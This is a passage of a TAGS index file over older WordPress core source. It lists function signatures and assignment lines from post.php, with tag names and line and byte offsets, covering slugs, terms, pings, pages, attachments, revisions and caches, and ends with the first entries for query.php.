				$alt_post_name = substr ($slug, 0, 200 - ( strlen( $suffix ) + 1 ) ) . "-$suffix";alt_post_name2853,99082
				$post_name_check = $wpdb->get_var( $wpdb->prepare($check_sql, $alt_post_name, $post_ID ) );post_name_check2854,99169
			$slug = $alt_post_name;slug2857,99313
		$check_sql = "SELECT post_name FROM $wpdb->posts WHERE post_name = %s AND post_type IN ( '" . implode( "', '", esc_sql( $hierarchical_post_types ) ) . "' ) AND ID != %d AND post_parent = %d LIMIT 1";check_sql2862,99563
		$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $slug, $post_ID, $post_parent ) );post_name_check2863,99765
			$suffix = 2;suffix2866,100096
				$alt_post_name = substr( $slug, 0, 200 - ( strlen( $suffix ) + 1 ) ) . "-$suffix";alt_post_name2868,100120
				$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $alt_post_name, $post_ID, $post_parent ) );post_name_check2869,100207
			$slug = $alt_post_name;slug2872,100366
		$check_sql = "SELECT post_name FROM $wpdb->posts WHERE post_name = %s AND post_type = %s AND ID != %d LIMIT 1";check_sql2876,100456
		$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $slug, $post_type, $post_ID ) );post_name_check2877,100570
			$suffix = 2;suffix2880,100811
				$alt_post_name = substr( $slug, 0, 200 - ( strlen( $suffix ) + 1 ) ) . "-$suffix";alt_post_name2882,100835
				$post_name_check = $wpdb->get_var( $wpdb->prepare( $check_sql, $alt_post_name, $post_type, $post_ID ) );post_name_check2883,100922
			$slug = $alt_post_name;slug2886,101079
function wp_add_post_tags($post_id = 0, $tags = '') {wp_add_post_tags2906,101632
function wp_add_post_tags($post_id = 0, $tags = '') {tags2906,101632
function wp_set_post_tags( $post_id = 0, $tags = '', $append = false ) {wp_set_post_tags2921,102155
function wp_set_post_tags( $post_id = 0, $tags = '', $append = false ) {post_id2921,102155
function wp_set_post_terms( $post_id = 0, $tags = '', $taxonomy = 'post_tag', $append = false ) {wp_set_post_terms2937,102781
function wp_set_post_terms( $post_id = 0, $tags = '', $taxonomy = 'post_tag', $append = false ) {post_id2937,102781
	$post_id = (int) $post_id;post_id2938,102879
		$tags = array();tags2944,102964
		$comma = _x( ',', 'tag delimiter' );comma2947,103014
			$tags = str_replace( $comma, ',', $tags );tags2949,103077
		$tags = explode( ',', trim( $tags, " \n\t\r\0\x0B," ) );tags2950,103123
		$tags = array_map( 'intval', $tags );tags2956,103381
		$tags = array_unique( $tags );tags2957,103421
function wp_set_post_categories($post_ID = 0, $post_categories = array()) {wp_set_post_categories2975,103799
function wp_set_post_categories($post_ID = 0, $post_categories = array()) {post_categories2975,103799
	$post_ID = (int) $post_ID;post_ID2976,103875
	$post_type = get_post_type( $post_ID );post_type2977,103903
	$post_status = get_post_status( $post_ID );post_status2978,103944
			$post_categories = array( get_option('default_category') );post_categories2982,104177
			$post_categories = array();post_categories2984,104247
		$post_categories = array_map('intval', $post_categories);post_categories2990,104411
		$post_categories = array_unique($post_categories);post_categories2991,104471
function wp_transition_post_status($new_status, $old_status, $post) {wp_transition_post_status3023,105634
function add_ping($post_id, $uri) {add_ping3043,106124
	$pung = $wpdb->get_var( $wpdb->prepare( "SELECT pinged FROM $wpdb->posts WHERE ID = %d", $post_id ));pung3045,106175
	$pung = trim($pung);pung3046,106278
	$pung = preg_split('/\s/', $pung);pung3047,106300
	$new = implode("\n", $pung);new3049,106353
	$new = apply_filters('add_ping', $new);new3050,106383
	$new = stripslashes($new);new3052,106452
function get_enclosed($post_id) {get_enclosed3065,106741
	$custom_fields = get_post_custom( $post_id );custom_fields3066,106775
	$pung = array();pung3067,106822
	foreach ( $custom_fields as $key => $val ) {key3071,106893
			$enclosure = explode( "\n", $enc );enclosure3075,107030
	$pung = apply_filters('get_enclosed', $pung, $post_id);pung3079,107114
function get_pung($post_id) {get_pung3092,107327
	$pung = $wpdb->get_var( $wpdb->prepare( "SELECT pinged FROM $wpdb->posts WHERE ID = %d", $post_id ));pung3094,107372
	$pung = trim($pung);pung3095,107475
	$pung = preg_split('/\s/', $pung);pung3096,107497
	$pung = apply_filters('get_pung', $pung);pung3097,107533
function get_to_ping($post_id) {get_to_ping3110,107728
	$to_ping = $wpdb->get_var( $wpdb->prepare( "SELECT to_ping FROM $wpdb->posts WHERE ID = %d", $post_id ));to_ping3112,107776
	$to_ping = sanitize_trackback_urls( $to_ping );to_ping3113,107883
	$to_ping = preg_split('/\s/', $to_ping, -1, PREG_SPLIT_NO_EMPTY);to_ping3114,107932
	$to_ping = apply_filters('get_to_ping',  $to_ping);to_ping3115,107999
function trackback_url_list($tb_list, $post_id) {trackback_url_list3127,108226
		$postdata = wp_get_single_post($post_id, ARRAY_A);postdata3130,108325
		$excerpt = strip_tags($post_excerpt ? $post_excerpt : $post_content);excerpt3136,108468
			$excerpt = substr($excerpt,0,252) . '...';excerpt3139,108573
		$trackback_urls = explode(',', $tb_list);trackback_urls3142,108624
			$tb_url = trim($tb_url);tb_url3144,108717
function get_all_page_ids() {get_all_page_ids3162,108957
	$page_ids = wp_cache_get('all_page_ids', 'posts');page_ids3165,109003
		$page_ids = $wpdb->get_col("SELECT ID FROM $wpdb->posts WHERE post_type = 'page'");page_ids3167,109089
function &get_page(&$page, $output = OBJECT, $filter = 'raw') {get_page3184,109569
function &get_page(&$page, $output = OBJECT, $filter = 'raw') {output3184,109569
	$p = get_post($page, $output, $filter);p3185,109633
function get_page_by_path($page_path, $output = OBJECT, $post_type = 'page') {get_page_by_path3200,110001
function get_page_by_path($page_path, $output = OBJECT, $post_type = 'page') {output3200,110001
	$page_path = rawurlencode(urldecode($page_path));page_path3203,110096
	$page_path = str_replace('%2F', '/', $page_path);page_path3204,110147
	$page_path = str_replace('%20', ' ', $page_path);page_path3205,110198
	$parts = explode( '/', trim( $page_path, '/' ) );parts3206,110249
	$parts = array_map( 'esc_sql', $parts );parts3207,110300
	$parts = array_map( 'sanitize_title_for_query', $parts );parts3208,110342
	$in_string = "'". implode( "','", $parts ) . "'";in_string3210,110402
	$post_type_sql = $post_type;post_type_sql3211,110453
	$pages = $wpdb->get_results( "SELECT ID, post_name, post_parent FROM $wpdb->posts WHERE post_name IN ($in_string) AND (post_type = '$post_type_sql' OR post_type = 'attachment')", OBJECT_K );pages3213,110524
	$revparts = array_reverse( $parts );revparts3215,110717
	$foundid = 0;foundid3217,110756
			$count = 0;count3220,110854
			$p = $page;p3221,110869
				$parent = $pages[ $p->post_parent ];parent3224,110972
				$p = $parent;p3227,111112
				$foundid = $page->ID;foundid3231,111243
function get_page_by_title($page_title, $output = OBJECT, $post_type = 'page' ) {get_page_by_title3254,111662
function get_page_by_title($page_title, $output = OBJECT, $post_type = 'page' ) {output3254,111662
	$page = $wpdb->get_var( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_title = %s AND post_type= %s", $page_title, $post_type ) );page3256,111759
function &get_page_children($page_id, $pages) {get_page_children3276,112349
	$page_list = array();page_list3277,112397
			if ( $children = get_page_children($page->ID, $pages) )children3281,112526
				$page_list = array_merge($page_list, $children);page_list3282,112585
function &get_page_hierarchy( &$pages, $page_id = 0 ) {get_page_hierarchy3300,113029
function &get_page_hierarchy( &$pages, $page_id = 0 ) {page_id3300,113029
		$result = array();result3302,113111
	$children = array();children3306,113154
		$parent_id = intval( $p->post_parent );parent_id3308,113212
	$result = array();result3312,113292
 * function to traverse and return all the nested children post names of a root page.to3319,113391
function _page_traverse_name( $page_id, &$children, &$result ){_page_traverse_name3324,113548
function get_page_uri($page) {get_page_uri3343,114026
		$page = get_page($page);page3345,114084
	$uri = $page->post_name;uri3346,114111
		$page = get_page($page->post_parent);page3353,114267
		$uri = $page->post_name . "/" . $uri;uri3354,114307
function &get_pages($args = '') {get_pages3373,114804
	$defaults = array(defaults3376,114854
	$r = wp_parse_args( $args, $defaults );r3386,115204
	$number = (int) $number;number3388,115272
	$offset = (int) $offset;offset3389,115298
	$hierarchical_post_types = get_post_types( array( 'hierarchical' => true ) );hierarchical_post_types3392,115369
		$post_status = explode( ',', $post_status );post_status3398,115599
	$cache = array();cache3402,115716
	$key = md5( serialize( compact(array_keys($defaults)) ) );key3403,115735
	if ( $cache = wp_cache_get( 'get_pages', 'posts' ) ) {cache3404,115795
			$pages = apply_filters('get_pages', $cache[ $key ], $r );pages3406,115906
		$cache = array();cache3412,116019
	$inclusions = '';inclusions3414,116040
		$child_of = 0; //ignore child_of, parent, exclude, meta_key, and meta_value params if using includechild_of3416,116086
		$parent = -1;parent3417,116188
		$exclude = '';exclude3418,116204
		$meta_key = '';meta_key3419,116221
		$meta_value = '';meta_value3420,116239
		$hierarchical = false;hierarchical3421,116259
		$incpages = wp_parse_id_list( $include );incpages3422,116284
					$inclusions = $wpdb->prepare(' AND ( ID = %d ', $incpage);inclusions3426,116427
	$exclusions = '';exclusions3435,116623
		$expages = wp_parse_id_list( $exclude );expages3437,116669
					$exclusions = $wpdb->prepare(' AND ( ID <> %d ', $expage);exclusions3441,116808
	$author_query = '';author_query3450,117005
		$post_authors = preg_split('/[\s,]+/',$authors);post_authors3452,117051
					$post_author = get_user_by('login', $post_author);post_author3458,117275
					$post_author = $post_author->ID;post_author3463,117431
					$author_query = $wpdb->prepare(' post_author = %d ', $post_author);author_query3467,117507
				$author_query = " AND ($author_query)";author_query3472,117701
	$join = '';join3476,117753
	$where = "$exclusions $inclusions ";where3477,117766
		$join = " LEFT JOIN $wpdb->postmeta ON ( $wpdb->posts.ID = $wpdb->postmeta.post_id )";join3479,117861
		$meta_key = stripslashes($meta_key);meta_key3482,117997
		$meta_value = stripslashes($meta_value);meta_value3483,118036
		$where_post_type = $wpdb->prepare( "post_type = %s AND post_status = %s", $post_type, array_shift( $post_status ) );where_post_type3495,118428
		$post_status = implode( "', '", $post_status );post_status3497,118557
		$where_post_type = $wpdb->prepare( "post_type = %s AND post_status IN ('$post_status')", $post_type );where_post_type3498,118607
	$orderby_array = array();orderby_array3501,118716
	$allowed_keys = array('author', 'post_author', 'date', 'post_date', 'title', 'post_title', 'name', 'post_name', 'modified',allowed_keys3502,118743
		$orderby = trim( $orderby );orderby3506,119065
				$orderby = "$wpdb->posts.ID";orderby3514,119227
				$orderby = 'RAND()';orderby3517,119288
				$orderby = "$wpdb->posts.comment_count";orderby3520,119349
					$orderby = "$wpdb->posts." . $orderby;orderby3524,119462
					$orderby = "$wpdb->posts.post_" . $orderby;orderby3526,119515
	$sort_column = ! empty( $orderby_array ) ? implode( ',', $orderby_array ) : "$wpdb->posts.post_title";sort_column3532,119604
	$sort_order = strtoupper( $sort_order );sort_order3534,119709
		$sort_order = 'ASC';sort_order3536,119830
	$query = "SELECT * FROM $wpdb->posts $join WHERE ($where_post_type) $where ";query3538,119854
	$pages = $wpdb->get_results($query);pages3545,120095
		$pages = apply_filters('get_pages', array(), $r);pages3548,120158
	$num_pages = count($pages);num_pages3553,120287
		$pages = & get_page_children($child_of, $pages);pages3562,120492
		$exclude = (int) $exclude_tree;exclude3565,120576
		$children = get_page_children($exclude, $pages);children3566,120610
		$excludes = array();excludes3567,120661
		$num_pages = count($pages);num_pages3571,120773
		for ( $i = 0; $i < $num_pages; $i++ ) {i3572,120803
	$pages = apply_filters('get_pages', $pages, $r);pages3581,120996
function is_local_attachment($url) {is_local_attachment3598,121286
	if ( $id = url_to_postid($url) ) {id3603,121454
		$post = & get_post($id);post3604,121490
function wp_insert_attachment($object, $file = false, $parent = 0) {wp_insert_attachment3652,123616
function wp_insert_attachment($object, $file = false, $parent = 0) {file3652,123616
	$defaults = array('post_status' => 'inherit', 'post_type' => 'post', 'post_author' => $user_ID,defaults3655,123711
	$object = wp_parse_args($object, $defaults);object3660,124066
	$object = sanitize_post($object, 'db');object3666,124205
		$post_author = $user_ID;post_author3672,124336
	$post_type = 'attachment';post_type3674,124364
		$post_status = 'inherit';post_status3677,124459
			$post_category = array( get_option('default_category') );post_category3683,124693
			$post_category = array();post_category3685,124761
		$update = true;update3690,124849
		$post_ID = (int) $ID;post_ID3691,124867
		$update = false;update3693,124901
		$post_ID = 0;post_ID3694,124920
		$post_name = sanitize_title($post_title);post_name3699,124996
		$post_name = sanitize_title($post_name);post_name3701,125046
	$post_name = wp_unique_post_slug($post_name, $post_ID, $post_status, $post_type, $post_parent);post_name3704,125124
		$post_date = current_time('mysql');post_date3707,125248
		$post_date_gmt = current_time('mysql', 1);post_date_gmt3709,125316
		$post_modified = $post_date;post_modified3712,125392
		$post_modified_gmt = $post_date_gmt;post_modified_gmt3714,125457
			$comment_status = 'closed';comment_status3718,125547
			$comment_status = get_option('default_comment_status');comment_status3720,125585
		$ping_status = get_option('default_ping_status');ping_status3723,125675
		$to_ping = preg_replace('|\s+|', "\n", $to_ping);to_ping3726,125752
		$to_ping = '';to_ping3728,125810
		$post_parent = (int) $post_parent;post_parent3731,125856
		$post_parent = 0;post_parent3733,125899
		$menu_order = (int) $menu_order;menu_order3736,125947
		$menu_order = 0;menu_order3738,125988
		$post_password = '';post_password3741,126039
		$pinged = '';pinged3744,126088
	$data = compact( array( 'post_author', 'post_date', 'post_date_gmt', 'post_content', 'post_content_filtered', 'post_title', 'post_excerpt', 'post_status', 'post_type', 'comment_status', 'ping_status', 'post_password', 'post_name', 'to_ping', 'pinged', 'post_modified', 'post_modified_gmt', 'post_parent', 'menu_order', 'post_mime_type', 'guid' ) );data3747,126140
	$data = stripslashes_deep( $data );data3748,126490
			$import_id = (int) $import_id;import_id3755,126716
		$post_ID = (int) $wpdb->insert_id;post_ID3762,126934
		$post_name = sanitize_title($post_title, $post_ID);post_name3766,127003
function wp_delete_attachment( $post_id, $force_delete = false ) {wp_delete_attachment3807,128233
function wp_delete_attachment( $post_id, $force_delete = false ) {force_delete3807,128233
	$meta = wp_get_attachment_metadata( $post_id );meta3822,128730
	$backup_sizes = get_post_meta( $post->ID, '_wp_attachment_backup_sizes', true );backup_sizes3823,128779
	$file = get_attached_file( $post_id );file3824,128861
	$intermediate_sizes = array();intermediate_sizes3826,128902
		if ( $intermediate = image_get_intermediate_size( $post_id, $size ) )intermediate3828,128989
	$comment_ids = $wpdb->get_col( $wpdb->prepare( "SELECT comment_ID FROM $wpdb->comments WHERE comment_post_ID = %d", $post_id ));comment_ids3842,129480
	$post_meta_ids = $wpdb->get_col( $wpdb->prepare( "SELECT meta_id FROM $wpdb->postmeta WHERE post_id = %d ", $post_id ));post_meta_ids3846,129694
	$uploadpath = wp_upload_dir();uploadpath3854,130034
			$thumbfile = str_replace(basename($file), $meta['thumb'], $file);thumbfile3859,130365
			$thumbfile = apply_filters('wp_delete_file', $thumbfile);thumbfile3860,130434
		$intermediate_file = apply_filters( 'wp_delete_file', $intermediate['path'] );intermediate_file3867,130676
			$del_file = path_join( dirname($meta['file']), $size['file'] );del_file3873,130903
			$del_file = apply_filters('wp_delete_file', $del_file);del_file3874,130970
	$file = apply_filters('wp_delete_file', $file);file3879,131098
function wp_get_attachment_metadata( $post_id = 0, $unfiltered = false ) {wp_get_attachment_metadata3898,131507
function wp_get_attachment_metadata( $post_id = 0, $unfiltered = false ) {post_id3898,131507
	$post_id = (int) $post_id;post_id3899,131582
	$data = get_post_meta( $post->ID, '_wp_attachment_metadata', true );data3903,131666
function wp_update_attachment_metadata( $post_id, $data ) {wp_update_attachment_metadata3920,132010
	$post_id = (int) $post_id;post_id3921,132070
	$data = apply_filters( 'wp_update_attachment_metadata', $data, $post->ID );data3925,132154
function wp_get_attachment_url( $post_id = 0 ) {wp_get_attachment_url3938,132432
function wp_get_attachment_url( $post_id = 0 ) {post_id3938,132432
	$post_id = (int) $post_id;post_id3939,132481
	$url = '';url3946,132623
	if ( $file = get_post_meta( $post->ID, '_wp_attached_file', true) ) { //Get attached filefile3947,132635
				$url = str_replace($uploads['basedir'], $uploads['baseurl'], $file); //replace file location with url locationurl3950,132928
				$url = $uploads['baseurl'] . substr( $file, strpos($file, 'wp-content/uploads') + 18 );url3952,133103
				$url = $uploads['baseurl'] . "/$file"; //Its a newly uploaded file, therefor $file is relative to the basedir.url3954,133203
		$url = get_the_guid( $post->ID );url3959,133457
	$url = apply_filters( 'wp_get_attachment_url', $url, $post->ID );url3961,133494
function wp_get_attachment_thumb_file( $post_id = 0 ) {wp_get_attachment_thumb_file3977,133794
function wp_get_attachment_thumb_file( $post_id = 0 ) {post_id3977,133794
	$post_id = (int) $post_id;post_id3978,133850
	if ( !is_array( $imagedata = wp_get_attachment_metadata( $post->ID ) ) )imagedata3981,133933
	$file = get_attached_file( $post->ID );file3984,134024
function wp_get_attachment_thumb_url( $post_id = 0 ) {wp_get_attachment_thumb_url3999,134482
function wp_get_attachment_thumb_url( $post_id = 0 ) {post_id3999,134482
	$post_id = (int) $post_id;post_id4000,134537
	$sized = image_downsize( $post_id, 'thumbnail' );sized4006,134688
	$url = str_replace(basename($url), basename($thumb), $url);url4013,134852
function wp_attachment_is_image( $post_id = 0 ) {wp_attachment_is_image4026,135113
function wp_attachment_is_image( $post_id = 0 ) {post_id4026,135113
	$post_id = (int) $post_id;post_id4027,135163
	$ext = preg_match('/\.([^.]+)$/', $file, $matches) ? strtolower($matches[1]) : false;ext4034,135312
	$image_exts = array('jpg', 'jpeg', 'gif', 'png');image_exts4036,135400
function wp_mime_type_icon( $mime = 0 ) {wp_mime_type_icon4051,135763
function wp_mime_type_icon( $mime = 0 ) {mime4051,135763
		$icon = wp_cache_get("mime_type_icon_$mime");icon4053,135832
		$post_id = 0;post_id4055,135903
		$post_mimes = array();post_mimes4056,135919
			$mime = (int) $mime;mime4058,135973
			if ( $post =& get_post( $mime ) ) {post4059,135997
				$post_id = (int) $post->ID;post_id4060,136036
				$ext = preg_replace('/^.+?\.([^.]+)$/', '$1', $post->guid);ext4061,136068
					if ( $ext_type = wp_ext2type( $ext ) )ext_type4064,136185
				$mime = $post->post_mime_type;mime4067,136268
				$mime = 0;mime4069,136315
		$icon_files = wp_cache_get('icon_files');icon_files4075,136377
			$icon_dir = apply_filters( 'icon_dir', ABSPATH . WPINC . '/images/crystal' );icon_dir4078,136456
			$icon_dir_uri = apply_filters( 'icon_dir_uri', includes_url('images/crystal') );icon_dir_uri4079,136537
			$dirs = apply_filters( 'icon_dirs', array($icon_dir => $icon_dir_uri) );dirs4080,136621
			$icon_files = array();icon_files4081,136697
				$keys = array_keys( $dirs );keys4083,136744
				$dir = array_shift( $keys );dir4084,136777
				$uri = array_shift($dirs);uri4085,136810
				if ( $dh = opendir($dir) ) {dh4086,136841
					while ( false !== $file = readdir($dh) ) {file4087,136874
						$file = basename($file);file4088,136922
		foreach ( $icon_files as $file => $uri )file4105,137389
		$matches = wp_match_mime_types(array_keys($types), $post_mimes);matches4114,137717
		foreach ( $matches as $match => $wilds ) {match4117,137827
				$icon = $types[$wilds[0]];icon4119,137908
	return apply_filters( 'wp_mime_type_icon', $icon, $mime, $post_id ); // Last arg is 0 if function pass mime type.pass4127,138043
 * The function is used when a post object of any type is updated,is4133,138247
 * The most logically usage of this function is redirecting changed post objects, sois4140,138545
function wp_check_for_changed_slugs($post_id, $post, $post_before) {wp_check_for_changed_slugs4150,138895
	$old_slugs = (array) get_post_meta($post_id, '_wp_old_slug');old_slugs4159,139229
 * This function provides a standardized way to appropriately select on theprovides4173,139751
 * post_status of a post type. The function will return a piece of SQL codewill4174,139827
function get_private_posts_cap_sql( $post_type ) {get_private_posts_cap_sql4185,140233
function get_posts_by_author_sql( $post_type, $full = true, $post_author = null ) {get_posts_by_author_sql4200,140768
function get_posts_by_author_sql( $post_type, $full = true, $post_author = null ) {full4200,140768
	$post_type_obj = get_post_type_object( $post_type );post_type_obj4204,140896
	if ( ! $cap = apply_filters( 'pub_priv_sql_capability', '' ) )cap4209,141084
		$cap = $post_type_obj->cap->read_private_posts;cap4210,141148
			$sql = $wpdb->prepare( 'WHERE post_type = %s AND ', $post_type );sql4214,141248
			$sql = $wpdb->prepare( 'WHERE post_author = %d AND post_type = %s AND ', $post_author, $post_type );sql4216,141328
		$sql = '';sql4219,141446
		$id = (int) $user_ID;id4229,141730
		} elseif ( $id == (int) $post_author ) {id4232,141862
function get_lastpostdate($timezone = 'server') {get_lastpostdate4256,142518
function get_lastpostmodified($timezone = 'server') {get_lastpostmodified4273,143180
	$lastpostmodified = _get_last_post_time( $timezone, 'modified' );lastpostmodified4274,143234
	$lastpostdate = get_lastpostdate($timezone);lastpostdate4276,143302
		$lastpostmodified = $lastpostdate;lastpostmodified4278,143390
function _get_last_post_time( $timezone, $field ) {_get_last_post_time4293,143801
	$timezone = strtolower( $timezone );timezone4299,143943
	$key = "lastpost{$field}:$timezone";key4301,143982
	$date = wp_cache_get( $key, 'timeinfo' );date4303,144021
		$add_seconds_server = date('Z');add_seconds_server4306,144082
		$post_types = get_post_types( array( 'public' => true ) );post_types4308,144118
		$post_types = "'" . implode( "', '", $post_types ) . "'";post_types4310,144242
				$date = $wpdb->get_var("SELECT post_{$field}_gmt FROM $wpdb->posts WHERE post_status = 'publish' AND post_type IN ({$post_types}) ORDER BY post_{$field}_gmt DESC LIMIT 1");date4314,144343
				$date = $wpdb->get_var("SELECT post_{$field} FROM $wpdb->posts WHERE post_status = 'publish' AND post_type IN ({$post_types}) ORDER BY post_{$field}_gmt DESC LIMIT 1");date4317,144547
				$date = $wpdb->get_var("SELECT DATE_ADD(post_{$field}_gmt, INTERVAL '$add_seconds_server' SECOND) FROM $wpdb->posts WHERE post_status = 'publish' AND post_type IN ({$post_types}) ORDER BY post_{$field}_gmt DESC LIMIT 1");date4320,144749
function update_post_cache( &$posts ) {update_post_cache4340,145217
 * This function not run if $_wp_suspend_cache_invalidation is not empty. Seenot4356,145610
function clean_post_cache( $post ) {clean_post_cache4367,145956
	$post = get_post( $post );post4373,146104
	if ( $children = $wpdb->get_results( $wpdb->prepare("SELECT ID, post_type FROM $wpdb->posts WHERE post_parent = %d", $post->ID) ) ) {children4392,146589
function update_post_caches(&$posts, $post_type = 'post', $update_term_cache = true, $update_meta_cache = true) {update_post_caches4422,147518
function update_post_caches(&$posts, $post_type = 'post', $update_term_cache = true, $update_meta_cache = true) {post_type4422,147518
	$post_ids = array();post_ids4429,147754
		$post_type = 'post';post_type4434,147859
			$ptypes = $post_type;ptypes4438,147944
			$ptypes = array_unique($ptypes);ptypes4443,148124
			$ptypes = array($post_type);ptypes4445,148171
function update_postmeta_cache($post_ids) {update_postmeta_cache4472,148847
 * This function will not run if $_wp_suspend_cache_invalidation is not empty. Seewill4482,149116
function clean_attachment_cache($id, $clean_terms = false) {clean_attachment_cache4494,149492
function clean_attachment_cache($id, $clean_terms = false) {clean_terms4494,149492
	$id = (int) $id;id4500,149654
function _transition_post_status($new_status, $old_status, $post) {_transition_post_status4528,150335
	if ( $old_status != 'publish' && $new_status == 'publish' ) {new_status4531,150419
function _future_post_hook( $deprecated = '', $post ) {_future_post_hook4563,151754
function _future_post_hook( $deprecated = '', $post ) {deprecated4563,151754
function _publish_post_hook($post_id) {_publish_post_hook4580,152453
function _save_post_hook( $post_id, $post ) {_save_post_hook4607,153157
 * property will be updated and can be referenced after the function isis4619,153588
function _get_post_ancestors(&$_post) {_get_post_ancestors4630,153955
	$id = $_post->ancestors[] = (int) $_post->post_parent;id4641,154169
	while ( $ancestor = $wpdb->get_var( $wpdb->prepare("SELECT `post_parent` FROM $wpdb->posts WHERE ID = %d LIMIT 1", $id) ) ) {ancestor4642,154225
		if ( ( $ancestor == $_post->ID ) || in_array($ancestor,  $_post->ancestors) )ancestor4644,154418
		$id = $_post->ancestors[] = (int) $ancestor;id4646,154508
function _wp_post_revision_fields( $post = null, $autosave = false ) {_wp_post_revision_fields4667,155333
function _wp_post_revision_fields( $post = null, $autosave = false ) {post4667,155333
	static $fields = false;fields4668,155404
	static $fields = false;fields4668,155404
		$fields = array(fields4672,155482
		$fields = apply_filters( '_wp_post_revision_fields', $fields );fields4679,155637
	$return = array();return4689,156032
function wp_save_post_revision( $post_id ) {wp_save_post_revision4717,156944
	$return = _wp_put_post_revision( $post );return4732,157316
	$revisions = wp_get_post_revisions( $post_id, array( 'order' => 'ASC' ) );revisions4739,157534
	$delete = count($revisions) - WP_POST_REVISIONS;delete4742,157666
	$revisions = array_slice( $revisions, 0, $delete );revisions4747,157756
	for ( $i = 0; isset($revisions[$i]); $i++ ) {i4749,157810
function wp_get_post_autosave( $post_id ) {wp_get_post_autosave4771,158373
	$q = array(q4776,158473
	$autosave_query = new WP_Query;autosave_query4784,158663
	$autosave = $autosave_query->query( $q );autosave4787,158757
function _wp_get_post_autosave_hack( $query ) {_wp_get_post_autosave_hack4805,159149
function wp_is_post_revision( $post ) {wp_is_post_revision4819,159492
function wp_is_post_autosave( $post ) {wp_is_post_autosave4835,159896
function _wp_put_post_revision( $post = null, $autosave = false ) {_wp_put_post_revision4856,160484
function _wp_put_post_revision( $post = null, $autosave = false ) {post4856,160484
		$post = get_object_vars( $post );post4858,160577
		$post = get_post($post, ARRAY_A);post4860,160642
	$post = _wp_post_revision_fields( $post, $autosave );post4867,160883
	$post = add_magic_quotes($post); //since data is from dbpost4868,160938
	$revision_id = wp_insert_post( $post );revision_id4870,160997
function &wp_get_post_revision(&$post, $output = OBJECT, $filter = 'raw') {wp_get_post_revision4893,161571
function &wp_get_post_revision(&$post, $output = OBJECT, $filter = 'raw') {output4893,161571
	$null = null;null4894,161647
	if ( $output == OBJECT ) {output4900,161799
	} elseif ( $output == ARRAY_A ) {output4902,161847
		$_revision = get_object_vars($revision);_revision4903,161882
	} elseif ( $output == ARRAY_N ) {output4905,161946
		$_revision = array_values(get_object_vars($revision));_revision4906,161981
function wp_restore_post_revision( $revision_id, $fields = null ) {wp_restore_post_revision4931,162727
function wp_restore_post_revision( $revision_id, $fields = null ) {fields4931,162727
		$fields = array_keys( _wp_post_revision_fields() );fields4936,162912
	$update = array();update4938,162967
	$update = add_magic_quotes( $update ); //since data is from dbupdate4947,163179
	$post_id = wp_update_post( $update );post_id4949,163244
function wp_delete_post_revision( $revision_id ) {wp_delete_post_revision4974,163829
	$delete = wp_delete_post( $revision->ID );delete4978,163959
function wp_get_post_revisions( $post_id = 0, $args = null ) {wp_get_post_revisions5000,164403
function wp_get_post_revisions( $post_id = 0, $args = null ) {post_id5000,164403
	$defaults = array( 'order' => 'DESC', 'orderby' => 'date' );defaults5006,164595
	$args = wp_parse_args( $args, $defaults );args5007,164657
	$args = array_merge( $args, array( 'post_parent' => $post->ID, 'post_type' => 'revision', 'post_status' => 'inherit' ) );args5008,164701
function _set_preview($post) {_set_preview5015,164910
	$preview = wp_get_post_autosave($post->ID);preview5020,164986
	$preview = sanitize_post($preview);preview5025,165079
function _show_post_preview() {_show_post_preview5034,165273
		$id = (int) $_GET['preview_id'];id5037,165376
function wp_get_post_parent_id( $post_ID ) {wp_get_post_parent_id5055,165743
	$post = get_post( $post_ID );post5056,165788
function wp_check_post_hierarchy_for_loops( $post_parent, $post_ID ) {wp_check_post_hierarchy_for_loops5076,166339
	if ( $post_parent == $post_ID )post_parent5086,166585
function get_post_format_strings() {get_post_format_strings5112,167269
	$strings = array(strings5113,167306
function get_post_format_slugs() {get_post_format_slugs5135,168038
	$slugs = array_keys( get_post_format_strings() );slugs5136,168073
function get_post_format_string( $slug ) {get_post_format_string5148,168352
	$strings = get_post_format_strings();strings5149,168395
function set_post_thumbnail( $post, $thumbnail_id ) {set_post_thumbnail5165,168788
	$post = get_post( $post );post5166,168842
	$thumbnail_id = absint( $thumbnail_id );thumbnail_id5167,168870
		$thumbnail_html = wp_get_attachment_image( $thumbnail_id, 'thumbnail' );thumbnail_html5169,168974
function delete_post_thumbnail( $post ) {delete_post_thumbnail5185,169380
	$post = get_post( $post );post5186,169422
function get_post_format_link( $format ) {get_post_format_link5200,169671
	$term = get_term_by('slug', 'post-format-' . $format, 'post_format' );term5201,169714
function wp_delete_auto_drafts() {wp_delete_auto_drafts5212,169963
	$old_posts = $wpdb->get_col( "SELECT ID FROM $wpdb->posts WHERE post_status = 'auto-draft' AND DATE_SUB( NOW(), INTERVAL 7 DAY ) > post_date" );old_posts5216,170063
function _post_format_request( $qvs ) {_post_format_request5227,170407
	$slugs = get_post_format_slugs();slugs5230,170501
	$tax = get_taxonomy( 'post_format' );tax5233,170655
function _post_format_link( $link, $term, $taxonomy ) {_post_format_link5246,170934
		$link = remove_query_arg( 'post_format', $link );link5253,171233
function _post_format_get_term( $term ) {_post_format_get_term5265,171586
function _post_format_get_terms( $terms, $taxonomies, $args ) {_post_format_get_terms5279,171974
			foreach( $terms as $order => $name ) {order5282,172161
			foreach ( (array) $terms as $order => $term ) {order5286,172308
function _post_format_wp_get_object_terms( $terms ) {_post_format_wp_get_object_terms5303,172788
	foreach ( (array) $terms as $order => $term ) {order5304,172842
function _update_term_count_on_transition_post_status( $new_status, $old_status, $post ) {_update_term_count_on_transition_post_status5322,173467
		$tt_ids = wp_get_object_terms( $post->ID, $taxonomy, array( 'fields' => 'tt_ids' ) );tt_ids5325,173676
function _prime_post_caches( $ids, $update_term_cache = true, $update_meta_cache = true ) {_prime_post_caches5341,174157
function _prime_post_caches( $ids, $update_term_cache = true, $update_meta_cache = true ) {update_term_cache5341,174157
	$non_cached_ids = _get_non_cached_ids( $ids, 'posts' );non_cached_ids5344,174265
		$fresh_posts = $wpdb->get_results( sprintf( "SELECT $wpdb->posts.* FROM $wpdb->posts WHERE ID IN (%s)", join( ",", $non_cached_ids ) ) );fresh_posts5346,174358

wordpress/wp-includes/query.php,39681
function get_query_var($var) {get_query_var24,495
function get_queried_object() {get_queried_object40,772
function get_queried_object_id() {get_queried_object_id55,1069
function set_query_var($var, $value) {set_query_var71,1347
function &query_posts($query) {query_posts89,1735
function wp_reset_query() {wp_reset_query105,2214
